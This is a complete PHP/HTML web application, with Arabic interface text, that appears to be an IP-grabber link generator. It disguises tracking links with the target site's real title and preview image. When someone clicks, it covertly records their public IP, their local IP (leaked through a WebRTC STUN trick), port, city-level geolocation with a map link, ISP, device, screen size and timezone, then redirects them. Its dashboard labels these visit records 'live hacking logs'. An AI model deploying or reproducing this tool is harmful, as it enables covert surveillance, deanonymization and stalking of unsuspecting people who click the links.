<?php
// ضبط المنطقة الزمنية للجزائر بدقة
date_default_timezone_set('Africa/Algiers');

// إظهار الأخطاء للتشخيص
ini_set('display_errors', 1);
error_reporting(E_ALL);

try {
    $db = new PDO('sqlite:tracker.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    $db->exec("CREATE TABLE IF NOT EXISTS links (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT UNIQUE, 
        target_url TEXT, 
        meta_title TEXT,
        meta_image TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");

    $db->exec("CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT, 
        public_ip TEXT, 
        local_ip TEXT, 
        port TEXT, 
        country TEXT, 
        city TEXT, 
        lat TEXT, 
        lon TEXT, 
        isp TEXT, 
        device_info TEXT, 
        screen_res TEXT, 
        timezone TEXT, 
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");
} catch (Exception $e) {
    die("خطأ في قاعدة البيانات: " . $e->getMessage());
}

// دالة سحب العنوان والصورة الأصلية ديناميكياً من أي موقع
function fetch_real_meta($url) {$title = "";
    $image = "";

    if (preg_match('/(?:youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/\s]{11})/', $url,$matches)) {
        $video_id =$matches[1];
        $image = "https://img.youtube.com/vi/{$video_id}/hqdefault.jpg";
        
        $oembed_url = "https://www.youtube.com/oembed?url=" . urlencode($url) . "&format=json";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,$oembed_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 3);
        $json = curl_exec($ch);
        curl_close($ch);
        
        if ($json) {
            $data = json_decode($json, true);
            if (isset($data['title'])) {
                $title =$data['title'];
            }
        }
    }

    if (empty($title)) {$ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,$url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 3);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)');
        $html = curl_exec($ch);
        curl_close($ch);

        if ($html) {$dom = new DOMDocument();
            @$dom->loadHTML(mb_convert_encoding($html, 'HTML-ENTITIES', 'UTF-8'));
            $xpath = new DOMXPath($dom);

            $titleNodes =$xpath->query('//meta[@property="og:title"]/@content | //meta[@name="twitter:title"]/@content');
            if ($titleNodes->length > 0) {
                $title =$titleNodes->item(0)->nodeValue;
            } else {
                $nodes =$dom->getElementsByTagName('title');
                if ($nodes->length > 0) {
                    $title =$nodes->item(0)->nodeValue;
                }
            }

            if (empty($image)) {
                $imageNodes =$xpath->query('//meta[@property="og:image"]/@content | //meta[@name="twitter:image"]/@content');
                if ($imageNodes->length > 0) {
                    $image =$imageNodes->item(0)->nodeValue;
                }
            }
        }
    }

    if (empty($title)) {
        $title = parse_url($url, PHP_URL_HOST);
    }
    if (empty($image)) {$image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
    }

    return ['title' => trim($title), 'image' => trim($image)];
}

function get_real_ip() {
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',',$_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

function parse_isp($isp_name, $org_name) {$combined = $isp_name . ' ' .$org_name;
    if (stripos($combined, 'Mobilis') !== false or stripos($combined, 'ATM') !== false) return 'Mobilis';
    if (stripos($combined, 'Djezzy') !== false or stripos($combined, 'Optimum Telecom') !== false) return 'Djezzy';
    if (stripos($combined, 'Ooredoo') !== false or stripos($combined, 'Wataniya') !== false) return 'Ooredoo';
    if (stripos($combined, 'Algérie Télécom') !== false or stripos($combined, 'Algerie Telecom') !== false or stripos($combined, 'AT') !== false) return 'Algérie Télécom';
    return trim($isp_name) ?: 'Unknown';
}

function get_device_type($ua) {$brand = 'Device';
    if (stripos($ua, 'Samsung') !== false)$brand = 'Samsung';
    elseif (stripos($ua, 'iPhone') !== false)$brand = 'iPhone';
    elseif (stripos($ua, 'Huawei') !== false)$brand = 'Huawei';
    elseif (stripos($ua, 'Xiaomi') !== false or stripos($ua, 'Redmi') !== false)$brand = 'Xiaomi';
    elseif (stripos($ua, 'Oppo') !== false)$brand = 'Oppo';

    if (stripos($ua, 'Android') !== false) return$brand . ' - Android';
    if (stripos($ua, 'iPhone') !== false or stripos($ua, 'iPad') !== false) return$brand . ' - iOS';
    if (stripos($ua, 'Windows') !== false) return 'PC - Windows';
    if (stripos($ua, 'Macintosh') !== false) return 'PC - Mac';
    return 'Unknown Device';
}

function get_ip_details($ip) {
    if ($ip == '127.0.0.1' or $ip == '::1' or$ip == 'Unknown' or strpos($ip, '10.') === 0 or strpos($ip, '192.168.') === 0) {
        return ['country' => 'Algeria (Local)', 'city' => 'Local Network', 'lat' => '36.7538', 'lon' => '3.0588', 'isp' => 'Localhost'];
    }
    $json = @file_get_contents("http://ip-api.com/json/" . $ip . "?fields=status,country,city,lat,lon,isp,org");
    $data = json_decode($json, true);
    if ($data and isset($data['status']) and$data['status'] == 'success') {
        return [
            'country' => $data['country'] ?? 'Unknown',
            'city' => $data['city'] ?? 'Unknown',
            'lat' => $data['lat'] ?? '36.7538', 
            'lon' =>$data['lon'] ?? '3.0588',
            'isp' => parse_isp($data['isp'] ?? '',$data['org'] ?? '')
        ];
    }
    return ['country' => 'Unknown', 'city' => 'Unknown', 'lat' => '36.7538', 'lon' => '3.0588', 'isp' => 'Unknown'];
}

// 1. معالجة التوجيه
$og_title = "Secure Terminal";
$og_image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";

if (isset($_GET['r'])) {
    $code =$_GET['r'];
    $stmt =$db->prepare("SELECT * FROM links WHERE code = ?");
    $stmt->execute([$code]);
    $link =$stmt->fetch(PDO::FETCH_ASSOC);

    if ($link) {
        $target =$link['target_url'];
        $og_title =$link['meta_title'];
        $og_image =$link['meta_image'];

        $public_ip = get_real_ip();$local_ip = $_GET['lip'] ?? 'N/A';$port = $_SERVER['REMOTE_PORT'] ?? 'N/A';$geo = get_ip_details($public_ip);$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';$device = get_device_type($ua);$screen = $_GET['screen'] ?? 'N/A';$tz = $_GET['tz'] ?? 'N/A';$created_at = date('Y-m-d H:i:s');

        if (isset($_GET['screen'])) {
            try {
                $logStmt =$db->prepare("INSERT INTO logs (code, public_ip, local_ip, port, country, city, lat, lon, isp, device_info, screen_res, timezone, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
                $logStmt->execute([$code, $public_ip,$local_ip, $port,$geo['country'], $geo['city'],$geo['lat'], $geo['lon'],$geo['isp'], $device,$screen, $tz,$created_at]);
            } catch (Exception $e) {}

            header("Location: " . $target);
            exit();
        }
    } else {
        die("Link not found.");
    }
}

// 2. إنشاء رابط جديد
$generated_link = "";
$tracking_code = "";
if ($_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['create'])) {
    $target_url = trim($_POST['target_url']);
    if (!filter_var($target_url, FILTER_VALIDATE_URL)) {
        $target_url = "https://" . $target_url;
    }

    $meta = fetch_real_meta($target_url);

    $code = substr(md5(uniqid(rand(), true)), 0, 7);
    $stmt =$db->prepare("INSERT INTO links (code, target_url, meta_title, meta_image) VALUES (?, ?, ?, ?)");
    $stmt->execute([$code,$target_url, $meta['title'],$meta['image']]);

    $tracking_code =$code;
    $domain = $_SERVER['HTTP_HOST'];$generated_link = "https://" . $domain . "/?r=" . $code;
}

$total_links =$db->query("SELECT COUNT(*) FROM links")->fetchColumn();
$total_visits =$db->query("SELECT COUNT(*) FROM logs")->fetchColumn();

// فصل ملفات البحث والمعالجة
$filter_code = trim($_GET['track'] ?? '');
if (!empty($filter_code)) {
    $stmt =$db->prepare("SELECT * FROM logs WHERE code = ? ORDER BY id DESC");
    $stmt->execute([$filter_code]);
    $logs =$stmt->fetchAll(PDO::FETCH_ASSOC);
} else {
    $logs =$db->query("SELECT * FROM logs ORDER BY id DESC LIMIT 50")->fetchAll(PDO::FETCH_ASSOC);
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo htmlspecialchars($og_title); ?></title>
    
    <meta property="og:title" content="<?php echo htmlspecialchars($og_title); ?>">
    <meta property="og:image" content="<?php echo htmlspecialchars($og_image); ?>">
    <meta property="og:type" content="website">

    <style>
        :root {
            --bg-main: #020408;
            --bg-card: #080d16;
            --border-color: #0f2218;
            --text-main: #00ff66;
            --text-muted: #4e8062;
            --accent: #00cc52;
            --accent-hover: #00993d;
            --success: #00ff66;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Courier New', Courier, monospace; }
        body { background-color: var(--bg-main); color: var(--text-main); padding: 30px 15px; line-height: 1.6; background-image: radial-gradient(circle at 50% 50%, #051910 0%, #020408 100%); min-height: 100vh; }
        .wrapper { max-width: 1200px; margin: 0 auto; display: grid; gap: 24px; }
        
        header { display: flex; justify-content: space-between; align-items: center; background: var(--bg-card); border: 1px solid var(--border-color); padding: 20px 25px; border-radius: 6px; box-shadow: 0 0 15px rgba(0, 255, 102, 0.05); }
        header h1 { font-size: 16px; font-weight: bold; color: #00ff66; text-transform: uppercase; letter-spacing: 1px; }
        .metrics { display: flex; gap: 15px; }
        .metric-card { background: #020408; border: 1px solid var(--border-color); padding: 8px 16px; border-radius: 4px; text-align: center; }
        .metric-card span { display: block; font-size: 10px; color: var(--text-muted); text-transform: uppercase; }
        .metric-card strong { font-size: 15px; color: #00ff66; }

        .section-box { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 6px; padding: 25px; box-shadow: 0 4px 20px rgba(0,0,0,0.8); }
        h2 { font-size: 14px; font-weight: bold; margin-bottom: 16px; color: #00ff66; border-bottom: 1px solid var(--border-color); padding-bottom: 10px; text-transform: uppercase; letter-spacing: 1px; }

        .form-row { display: flex; gap: 10px; position: relative; }
        input[type="text"] { flex: 1; background: #020408; border: 1px solid var(--border-color); border-radius: 4px; padding: 12px 14px; color: #00ff66; font-size: 14px; outline: none; transition: border 0.2s; font-family: monospace; }
        input[type="text"]:focus { border-color: var(--accent); box-shadow: 0 0 8px rgba(0,255,102,0.2); }
        
        .btn { background: var(--accent); color: #020408; border: none; padding: 0 20px; border-radius: 4px; font-weight: bold; cursor: pointer; transition: background 0.2s; text-decoration: none; display: inline-flex; align-items: center; justify-content: center; font-size: 13px; white-space: nowrap; height: 46px; text-transform: uppercase; }
        .btn:hover { background: var(--accent-hover); box-shadow: 0 0 10px rgba(0,255,102,0.4); }
        .btn-danger { background: #990000; color: #fff; }
        .btn-danger:hover { background: #cc0000; }
        .btn-secondary { background: #0f2218; color: #00ff66; border: 1px solid var(--border-color); }
        .btn-secondary:hover { background: #183827; }

        .input-action-group { position: relative; flex: 1; display: flex; gap: 6px; }
        .action-btn-inline { background: #0f2218; color: #00ff66; border: 1px solid var(--border-color); padding: 0 12px; font-size: 12px; border-radius: 4px; cursor: pointer; height: 46px; font-family: monospace; }
        .action-btn-inline:hover { background: #183827; }

        .result-panel { background: #020408; border: 1px solid var(--border-color); padding: 16px; border-radius: 4px; margin-top: 15px; }
        .result-panel label { display: block; font-size: 11px; color: var(--text-muted); margin-bottom: 6px; text-transform: uppercase; }
        .link-flex { display: flex; gap: 8px; }

        /* تكبير كود التتبع واضرازه بشكل اختراقي بارز */
        .big-tracking-code-box { background: #020408; border: 2px dashed #00ff66; padding: 15px; border-radius: 6px; text-align: center; margin-top: 15px; box-shadow: inset 0 0 10px rgba(0,255,102,0.1); }
        .big-tracking-code-box span { font-size: 11px; color: var(--text-muted); display: block; text-transform: uppercase; margin-bottom: 5px; }
        .big-code-val { font-size: 28px; font-weight: bold; color: #00ff66; letter-spacing: 3px; font-family: monospace; text-shadow: 0 0 10px rgba(0,255,102,0.5); }

        .toolbar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; flex-wrap: wrap; gap: 10px; }
        .search-form { display: flex; gap: 8px; max-width: 350px; width: 100%; }

        .table-wrap { overflow-x: auto; border: 1px solid var(--border-color); border-radius: 4px; }
        table { width: 100%; border-collapse: collapse; text-align: right; font-size: 12px; min-width: 1000px; }
        th { background: #020408; color: var(--text-muted); padding: 12px 15px; border-bottom: 1px solid var(--border-color); font-weight: bold; white-space: nowrap; text-transform: uppercase; }
        td { padding: 12px 15px; border-bottom: 1px solid var(--border-color); color: #00ff66; white-space: nowrap; }
        tr:hover { background: rgba(15, 34, 24, 0.4); }
        
        .code-badge { background: rgba(0, 255, 102, 0.1); color: #00ff66; padding: 4px 8px; border-radius: 3px; font-family: monospace; font-size: 12px; border: 1px solid var(--border-color); }
        .ip-public { font-family: monospace; color: #00cc52; }
        .ip-local { font-family: monospace; color: #33ff99; }
        .port-tag { font-family: monospace; color: #ff3333; background: rgba(255, 51, 51, 0.1); padding: 2px 6px; border-radius: 3px; }
    </style>
    <script>
        function getLocalIP(callback) {
            let ips = [];
            let RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
            if (!RTCPeerConnection) { callback("N/A"); return; }
            let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
            pc.createDataChannel("");
            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
            
            pc.onicecandidate = function(ice) {
                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                let myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
                if (myIP) {
                    let ip = myIP[1];
                    if (!ips.includes(ip)) {
                        ips.push(ip);
                        if (ip.startsWith("192.168.") || ip.startsWith("10.") || ip.startsWith("172.")) {
                            callback(ip);
                            pc.onicecandidate = null;
                        }
                    }
                }
            };
            setTimeout(() => { if (ips.length === 0) callback("192.168.1.X"); }, 200);
        }

        document.addEventListener("DOMContentLoaded", function() {
            const urlParams = new URLSearchParams(window.location.search);
            const redirectCode = urlParams.get('r');
            const hasScreen = urlParams.has('screen');

            if (redirectCode && !hasScreen) {
                getLocalIP(function(localIp) {
                    const screenRes = screen.width + "x" + screen.height;
                    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
                    window.location.href = `/?r=${redirectCode}&lip=${encodeURIComponent(localIp)}&screen=${encodeURIComponent(screenRes)}&tz=${encodeURIComponent(tz)}`;
                });
            }
        });

        async function pasteClipboard(inputName) {
            try {
                const text = await navigator.clipboard.readText();
                document.querySelector(`input[name="${inputName}"]`).value = text;
            } catch (err) {
                alert('فشل اللصق التلقائي، يرجى اللصق يدوياً (Ctrl+V)');
            }
        }

        function copyText(text, btnElement) {
            navigator.clipboard.writeText(text).then(() => {
                const original = btnElement.innerText;
                btnElement.innerText = "[تم النسخ]";
                btnElement.style.background = "#00ff66";
                btnElement.style.color = "#020408";
                setTimeout(() => {
                    btnElement.innerText = original;
                    btnElement.style.background = "";
                    btnElement.style.color = "";
                }, 2000);
            });
        }
    </script>
</head>
<body>
    <div class="wrapper">
        
        <!-- الهيدر -->
        <header>
            <div>
                <h1>[ SECURE TERMINAL // V2.0 ]</h1>
            </div>
            <div class="metrics">
                <div class="metric-card">
                    <span>الروابط النشطة</span>
                    <strong><?php echo $total_links; ?></strong>
                </div>
                <div class="metric-card">
                    <span>إجمالي الزيارات</span>
                    <strong style="color: #00ff66;"><?php echo $total_visits; ?></strong>
                </div>
            </div>
        </header>

        <!-- قسم توليد الروابط -->
        <section class="section-box">
            <h2>> توليد رابط تعقب جديد</h2>
            <form method="POST" class="form-row">
                <div class="input-action-group">
                    <button type="button" class="action-btn-inline" onclick="pasteClipboard('target_url')">لصق</button>
                    <input type="text" name="target_url" placeholder="أدخل الرابط المستهدف هنا..." required>
                </div>
                <button type="submit" name="create" class="btn">تنفيذ التوليد</button>
            </form>

            <?php if (!empty($generated_link)): ?>
                <div class="result-panel">
                    <label>رابط التعقب النشط:</label>
                    <div class="link-flex">
                        <input type="text" readonly value="<?php echo htmlspecialchars($generated_link); ?>">
                        <button type="button" class="btn btn-secondary" onclick="copyText('<?php echo htmlspecialchars($generated_link); ?>', this)">نسخ الرابط</button>
                    </div>
                    
                    <!-- كود التتبع المكبر والبارز -->
                    <div class="big-tracking-code-box">
                        <span>كود التعقب الخاص بالرابط</span>
                        <div class="big-code-val"><?php echo htmlspecialchars($tracking_code); ?></div>
                        <button type="button" class="btn btn-secondary" style="margin-top: 10px; height: 36px; font-size: 11px;" onclick="copyText('<?php echo htmlspecialchars($tracking_code); ?>', this)">نسخ الكود حصرياً</button>
                    </div>

                    <div style="display: flex; justify-content: flex-end; align-items: center; margin-top: 12px; font-size: 12px;">
                        <a href="/?track=<?php echo htmlspecialchars($tracking_code); ?>" style="color: #00ff66; text-decoration: none;">[ تصفية السجلات لهذا الكود فقط ] →</a>
                    </div>
                </div>
            <?php endif; ?>
        </section>

        <!-- قسم السجلات الحية -->
        <section class="section-box">
            <div class="toolbar">
                <h2>> سجلات الاختراق والزيارات الحية</h2>
                <form method="GET" class="search-form">
                    <button type="button" class="action-btn-inline" onclick="pasteClipboard('track')" style="height: 42px;">لصق</button>
                    <input type="text" name="track" placeholder="بحث بكود التعقب..." value="<?php echo htmlspecialchars($filter_code); ?>" style="height: 42px;">
                    <button type="submit" class="btn" style="height: 42px;">بحث</button>
                    <?php if(!empty($filter_code)): ?>
                        <a href="/" class="btn btn-danger" style="height: 42px; text-decoration:none; display:flex; align-items:center;">إلغاء</a>
                    <?php endif; ?>
                </form>
            </div>

            <div class="table-wrap">
                <table>
                    <thead>
                        <tr>
                            <th>#ID</th>
                            <th>الكود</th>
                            <th>IP العام</th>
                            <th>IP المحلي</th>
                            <th>المنفذ</th>
                            <th>الجهاز</th>
                            <th>الموقع الجغرافي</th>
                            <th>مزود الخدمة</th>
                            <th>الشاشة والمنطقة</th>
                            <th>الوقت (التوقيت الجزائري)</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php if (empty($logs)): ?>
                            <tr><td colspan="10" style="text-align: center; color: var(--text-muted); padding: 30px;">لا توجد أي سجلات زيارات حتى الآن.</td></tr>
                        <?php else: ?>
                            <?php foreach ($logs as$log): ?>
                            <tr>
                                <td><?php echo $log['id']; ?></td>
                                <td>
                                    <span class="code-badge"><?php echo htmlspecialchars($log['code']); ?></span>
                                </td>
                                <td class="ip-public"><?php echo htmlspecialchars($log['public_ip'] ?? 'N/A'); ?></td>
                                <td class="ip-local"><?php echo htmlspecialchars($log['local_ip'] ?? 'N/A'); ?></td>
                                <td><span class="port-tag"><?php echo htmlspecialchars($log['port'] ?? 'N/A'); ?></span></td>
                                <td style="font-weight: bold; color: #00ff99;"><?php echo htmlspecialchars($log['device_info']); ?></td>
                                <td>
                                    <span><?php echo htmlspecialchars($log['country']); ?> / <?php echo htmlspecialchars($log['city']); ?></span><br>
                                    <a href="https://www.google.com/maps?q=<?php echo htmlspecialchars($log['lat']); ?>,<?php echo htmlspecialchars($log['lon']); ?>" target="_blank" style="font-size: 11px; color: #00cc52; text-decoration: none;">[ خريطة جوجل ↗ ]</a>
                                </td>
                                <td style="color: #00ff66;"><?php echo htmlspecialchars($log['isp']); ?></td>
                                <td><?php echo htmlspecialchars($log['screen_res']); ?></td>
                                <td style="color: #00ff66; font-weight: bold;"><?php echo htmlspecialchars($log['created_at']); ?></td>
                            </tr>
                            <?php endforeach; ?>
                        <?php endif; ?>
                    </tbody>
                </table>
            </div>
        </section>

    </div>
</body>
</html>
